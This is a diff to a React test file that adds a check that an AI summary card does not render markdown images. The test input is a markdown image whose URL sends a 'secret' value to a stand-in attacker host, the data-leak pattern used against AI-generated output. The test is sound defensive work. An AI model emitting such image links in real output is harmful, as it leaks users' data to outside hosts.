@@ -27,6 +27,12 @@ describe("RunAiSummaryCard", () => {
         expect(screen.getByRole("button", { name: "Regenerate" })).toBeInTheDocument();
     });
 
+    it("does not render images from the summary body", () => {
+        const { container } = render(<RunAiSummaryCard runId={1} runStatus="completed"
+            summary={{ status: "ready", headline: "H", body: "see ![leak](https://attacker.example/?q=secret)" }} />);
+        expect(container.querySelector("img")).toBeNull();
+    });
+
     it("shows progress while generating", () => {
         render(<RunAiSummaryCard runId={1} runStatus="failed" summary={{ status: "generating" }} />);
         expect(screen.getByText("Generating summary…")).toBeInTheDocument();
